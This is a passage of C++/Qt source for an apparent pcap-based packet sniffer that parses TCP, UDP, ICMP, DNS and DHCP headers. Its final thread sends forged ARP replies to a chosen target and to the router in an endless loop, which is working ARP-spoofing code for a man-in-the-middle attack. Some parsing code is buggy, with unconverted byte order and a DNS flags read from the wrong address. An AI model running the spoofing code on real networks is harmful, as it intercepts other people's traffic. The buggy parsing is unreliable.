        qDebug()<<"源端口:"<<ntohs(tcp_protocol->source_port);
        qDebug()<<"目的端口:"<<ntohs(tcp_protocol->dest_port);
        qDebug()<<"SEQ:"<<ntohl(tcp_protocol->seq);
        qDebug()<<"ACK SEQ:"<<ntohl(tcp_protocol->ack_seq);
        qDebug()<<"check:"<<checksum;

    //应用层协议解析
        if(ui->applicationBox->isChecked()&&(ntohs(tcp_protocol->source_port)==80 || ntohs(tcp_protocol->dest_port)==80))
            {
                //http协议
                //printf("http data:\n%s\n",packet_content+sizeof(tcphdr));
            }
}

void MainWindow::deeperUDPAnalyze(QByteArray transdata, QTreeWidgetItem *transRoot){
        struct udphdr *udp_protocol;
        u_int16_t checksum;

        udp_protocol = (struct udphdr *) transdata.data();
        checksum =ntohs(udp_protocol->check);

        QList<QTreeWidgetItem *> udpList;
        QTreeWidgetItem *uItem1=new QTreeWidgetItem;
        uItem1->setText(0,tr("Source Port: ")+QString::number(udp_protocol->source_port,10));
        udpList.append(uItem1);
        QTreeWidgetItem *uItem2=new QTreeWidgetItem;
        uItem2->setText(0,tr("Destination Port: ")+QString::number(udp_protocol->dest_port,10));
        udpList.append(uItem2);
        QTreeWidgetItem *uItem3=new QTreeWidgetItem;
        uItem3->setText(0,tr("Length: ")+QString::number(udp_protocol->len,10));
        udpList.append(uItem3);
        QTreeWidgetItem *uItem4=new QTreeWidgetItem;
        uItem4->setText(0,tr("Checksum: 0x")+QString::number(udp_protocol->check,16));
        udpList.append(uItem4);

        transRoot->insertChildren(0,udpList);


        qDebug()<<"---------UDP协议---------\n";
        qDebug()<<"源端口:"<< udp_protocol->source_port;
        qDebug()<<"目的端口:"<<udp_protocol->dest_port;
        qDebug()<<"len:"<<udp_protocol->len;
        qDebug()<<"check:"<<checksum;

        //应用层协议解析
        if(ui->applicationBox->isChecked()&&(ntohs(udp_protocol->source_port)==53 || ntohs(udp_protocol->dest_port)==53))
        {
            QByteArray appDate;
            for(int i=0;i<transdata.length()-8;i++){
                appDate.append(transdata[i+8]);
            }
            deeperDNSAnalyze(appDate);
        }
        if(ui->applicationBox->isChecked()&&(ntohs(udp_protocol->source_port)==67 ||ntohs(udp_protocol->source_port)==68 || ntohs(udp_protocol->dest_port)==67|| ntohs(udp_protocol->dest_port)==68))
        {
            QByteArray appDate;
            for(int i=0;i<transdata.length()-8;i++){
                appDate.append(transdata[i+8]);
            }
            deeperDHCPAnalyze(appDate);
        }

}

struct icmphdr{
    u_char type;
    u_char code;
    u_short cksum;
    u_short id;
    u_short seq;
};

void MainWindow::deeperICMPAnalyze(QByteArray transdata, QTreeWidgetItem *transRoot){
    struct icmphdr *icmp_protocol;
    //u_int16_t checksum;

    icmp_protocol = (struct icmphdr *)transdata.data();
    QList<QTreeWidgetItem *> icmpList;
    QTreeWidgetItem *cItem1=new QTreeWidgetItem;
    cItem1->setText(0,tr("Type: ")+QString::number(icmp_protocol->type,10));
    icmpList.append(cItem1);
    QTreeWidgetItem *cItem2=new QTreeWidgetItem;
    cItem2->setText(0,tr("Code: ")+QString::number(icmp_protocol->code,10));
    icmpList.append(cItem2);
    QTreeWidgetItem *cItem3=new QTreeWidgetItem;
    cItem3->setText(0,tr("Checksum: 0x")+QString::number(icmp_protocol->cksum,16));
    icmpList.append(cItem3);
    QTreeWidgetItem *cItem4=new QTreeWidgetItem;
    cItem4->setText(0,tr("Identification: 0x")+QString::number(icmp_protocol->id,16));
    icmpList.append(cItem4);
    QTreeWidgetItem *cItem5=new QTreeWidgetItem;
    cItem5->setText(0,tr("Sequence Number: 0x")+QString::number(icmp_protocol->seq,16));
    icmpList.append(cItem5);

    transRoot->insertChildren(0,icmpList);

}

struct dnshdr{
    u_short transID;
    u_int16_t qr:2,
    opcode:4,
    aa:1,
    tc:1,
    rd:1,
    ra:1,
    zero:3,
    rcode:4;
    u_short questionNum;
    u_short answerNum;
    u_short authority;
    u_short additional;
};

void MainWindow::deeperDNSAnalyze(QByteArray appdata){
    struct dnshdr *dns_protocol;
    dns_protocol = (struct dnshdr *)appdata.data();

    QList<QTreeWidgetItem*> dnsList;

    QTreeWidgetItem *dItem0=new QTreeWidgetItem;
    dItem0->setText(0,tr("This is a DNS protocol packet"));
    dnsList.append(dItem0);
    QTreeWidgetItem *dItem1=new QTreeWidgetItem;
    dItem1->setText(0,tr("Transaction ID: 0x")+QString::number(dns_protocol->transID,16));
    dnsList.append(dItem1);

    QTreeWidgetItem *dItem2=new QTreeWidgetItem;
    dItem2->setText(0,tr("Flags: 0x")+QString::number(*(((unsigned short *)&dns_protocol)+1),16));
    dnsList.append(dItem2);
    QList<QTreeWidgetItem*> flagsList;
    QTreeWidgetItem *dItem3=new QTreeWidgetItem;
    dItem3->setText(0,tr("Response: ")+QString::number(dns_protocol->qr,10));
    flagsList.append(dItem3);
    QTreeWidgetItem *dItem4=new QTreeWidgetItem;
    dItem4->setText(0,tr("Opcode: 0x")+QString::number(dns_protocol->opcode,16));
    flagsList.append(dItem4);
    QTreeWidgetItem *dItem5=new QTreeWidgetItem;
    dItem5->setText(0,tr("Truncated: ")+QString::number(dns_protocol->tc,10));
    flagsList.append(dItem5);
    QTreeWidgetItem *dItem6=new QTreeWidgetItem;
    dItem6->setText(0,tr("Recursion desired: ")+QString::number(dns_protocol->rd,10));
    flagsList.append(dItem6);
    QTreeWidgetItem *dItem7=new QTreeWidgetItem;
    dItem7->setText(0,tr("Zero (reserved): 0x")+QString::number(dns_protocol->zero,16));
    flagsList.append(dItem7);
    dItem2->insertChildren(0,flagsList);

    QTreeWidgetItem *dItem8=new QTreeWidgetItem;
    dItem8->setText(0,tr("Question: ")+QString::number(dns_protocol->questionNum,10));
    dnsList.append(dItem8);
    QTreeWidgetItem *dItem9=new QTreeWidgetItem;
    dItem9->setText(0,tr("Answer RRs: ")+QString::number(dns_protocol->answerNum,10));
    dnsList.append(dItem9);
    QTreeWidgetItem *dItem10=new QTreeWidgetItem;
    dItem10->setText(0,tr("Authority RRs: ")+QString::number(dns_protocol->authority,10));
    dnsList.append(dItem10);
    QTreeWidgetItem *dItem11=new QTreeWidgetItem;
    dItem11->setText(0,tr("Additional RRs: ")+QString::number(dns_protocol->additional,10));
    dnsList.append(dItem11);

    appRoot->insertChildren(0,dnsList);

}

struct dhcphdr{
    u_char   op;     //操作代码
    u_char   Htype;  //硬件地址类型  1表示以太网地址
    u_short  Hlen;   //硬件地址长度
    u_short  Hops;   //跳数  经过一个路由器加一
    int      Transaction_ID;  //事务ID  请求和回复时判断的依据  唯一
    u_short  Secs;   //客户机启动时间
    u_short  flags;
    u_char   Ciaddr[4];  //客户端IP地址  如果继续使用之前的IP
    u_char   Yiaddr[4];  //服务器提供的IP地址
    u_char   Siaddr[4];  //服务器IP地址
    u_char   Giaddr[4];  //转发代理地址  跨网段获取IP时候使用
};


void MainWindow::deeperDHCPAnalyze(QByteArray appdata){
    struct dhcphdr *dhcp_protocol;

    dhcp_protocol = (struct dhcphdr *)appdata.data();
    QList<QTreeWidgetItem *> dhcpList;

    QTreeWidgetItem *dItem0=new QTreeWidgetItem;
    dItem0->setText(0,tr("This is a DHCP protocol packet"));
    dhcpList.append(dItem0);
    QTreeWidgetItem *dItem1=new QTreeWidgetItem;
    dItem1->setText(0,tr("Message Type: ")+QString::number(dhcp_protocol->op,10));
    dhcpList.append(dItem1);
    QTreeWidgetItem *dItem2=new QTreeWidgetItem;
    dItem2->setText(0,tr("Hardware Type: 0x")+QString::number(dhcp_protocol->Htype,16));
    dhcpList.append(dItem2);
    QTreeWidgetItem *dItem3=new QTreeWidgetItem;
    dItem3->setText(0,tr("Hardeware Address Length: ")+QString::number(dhcp_protocol->Hlen,10));
    dhcpList.append(dItem3);
    QTreeWidgetItem *dItem4=new QTreeWidgetItem;
    dItem4->setText(0,tr("Hops: ")+QString::number(dhcp_protocol->Hops,10));
    dhcpList.append(dItem4);
    QTreeWidgetItem *dItem6=new QTreeWidgetItem;
    dItem6->setText(0,tr("Seconds Elapsed: ")+QString::number(dhcp_protocol->Secs,10));
    dhcpList.append(dItem6);
    QTreeWidgetItem *dItem7=new QTreeWidgetItem;
    dItem7->setText(0,tr("Bootp flags: 0x")+QString::number(dhcp_protocol->flags,16));
    dhcpList.append(dItem7);

    char tempchar[8][20];
    for(int i=0;i<IP_ADD_LEN;i++){
        tempchar[0][i]=appdata[12+i];
        tempchar[2][i]=appdata[16+i];
        tempchar[4][i]=appdata[20+i];
        tempchar[6][i]=appdata[24+i];
    }
    for(int i=0;i<4;i++){
        char2IP(tempchar[i*2+1],tempchar[i*2],IP_ADD_LEN);
    }


    QTreeWidgetItem *dItem8=new QTreeWidgetItem;
    QTreeWidgetItem *dItem9=new QTreeWidgetItem;
    QTreeWidgetItem *dItem10=new QTreeWidgetItem;
    QTreeWidgetItem *dItem11=new QTreeWidgetItem;
    dItem8->setText(0,tr("Client IP: ")+tr(tempchar[1]));
    dItem9->setText(0,tr("Host IP: ")+tr(tempchar[3]));
    dItem10->setText(0,tr("Server IP: ")+tr(tempchar[5]));
    dItem11->setText(0,tr("Proxy IP: ")+tr(tempchar[7]));
    dhcpList.append(dItem8);
    dhcpList.append(dItem9);
    dhcpList.append(dItem10);
    dhcpList.append(dItem11);

    appRoot->setText(0,"Bootstrap Protocol");
    appRoot->insertChildren(0,dhcpList);
}


void MainWindow::on_deveiveStartButton_clicked()
{
    QString mac=ui->targetMacEdit->text();
    QString ip=ui->targetIPEdit->text();
    sendPacketThread *s=new sendPacketThread(curhandle,Mac2char(mac),IP2char(ip));
    s->start();
}


sendPacketThread::sendPacketThread(pcap_t *adhandle,QByteArray targetMac, QByteArray targetIP){
    this->adhandle=adhandle;
    this->targetMac=targetMac;
    this->targetIP=targetIP;

}

#define ETH_ARP 0x0806
#define ARP_HARDWARE 1  //硬件类型字段值为表示以太网地址
#define ETH_IP 0x0800  //协议类型字段表示要映射的协议地址类型值为x0800表示IP地址
#define ARP_REQUEST 1
#define ARP_RESPONSE 0x0002

void sendPacketThread::run(){

        unsigned char sendTargetBuf[42]; //arp包结构大小，42个字节
        unsigned char sendRouterBuf[42];
        EthernetHeader eh;
        ArpHeader ah;
        //赋值MAC地址
        memcpy(eh.DestMAC, targetMac.data(), 6);   //以太网首部目的MAC地址，全为广播地址
        memcpy(eh.SourMAC, myMac, 6);   //以太网首部源MAC地址
        memcpy(ah.smac, myMac, 6);   //ARP字段源MAC地址
        memcpy(ah.dmac, targetMac.data(), 6);   //ARP字段目的MAC地址
        memcpy(ah.sip, routerIP, 4);   //ARP字段源IP地址
        memcpy(ah.dip, targetIP.data(), 4);   //ARP字段目的IP地址
        eh.EthType = htons(ETH_ARP);   //htons：将主机的无符号短整形数转换成网络字节顺序
        ah.hdType = htons(ARP_HARDWARE);
        ah.proType = htons(ETH_IP);
        ah.hdSize = 6;
        ah.proSize = 4;
        *((char *)&ah.op) = 0;
        *((char *)&ah.op+1) = ARP_RESPONSE;

        //构造一个ARP请求
        memset(sendTargetBuf, 0, sizeof(sendTargetBuf));   //ARP清零
        memcpy(sendTargetBuf, &eh, sizeof(eh));
        memcpy(sendTargetBuf + sizeof(eh), &ah, sizeof(ah));

        memcpy(eh.DestMAC, routerMac, 6);   //以太网首部目的MAC地址，全为广播地址
        memcpy(eh.SourMAC, myMac, 6);   //以太网首部源MAC地址
        memcpy(ah.smac, myMac, 6);   //ARP字段源MAC地址
        memcpy(ah.dmac, routerMac, 6);   //ARP字段目的MAC地址
        memcpy(ah.sip, targetIP.data(), 4);   //ARP字段源IP地址
        memcpy(ah.dip, routerIP, 4);   //ARP字段目的IP地址
        eh.EthType = htons(ETH_ARP);   //htons：将主机的无符号短整形数转换成网络字节顺序
        ah.hdType = htons(ARP_HARDWARE);
        ah.proType = htons(ETH_IP);
        ah.hdSize = 6;
        ah.proSize = 4;
        *((char *)&ah.op) = 0;
        *((char *)&ah.op+1) = ARP_RESPONSE;

        //构造一个ARP请求
        memset(sendRouterBuf, 0, sizeof(sendRouterBuf));   //ARP清零
        memcpy(sendRouterBuf, &eh, sizeof(eh));
        memcpy(sendRouterBuf + sizeof(eh), &ah, sizeof(ah));

        while(1){
            if (pcap_sendpacket(adhandle, sendTargetBuf, 42) == 0) {
                qDebug()<<"\nPacketSend succeed\n";
            }
            else {
                qDebug()<<"PacketSendPacket in getmine Error:"<<GetLastError();
            }
            if (pcap_sendpacket(adhandle, sendRouterBuf, 42) == 0) {
                qDebug()<<"\nPacketSend succeed\n";
            }
            else {
                qDebug()<<"PacketSendPacket in getmine Error:"<<GetLastError();
            }
            msleep(300);
        }
}

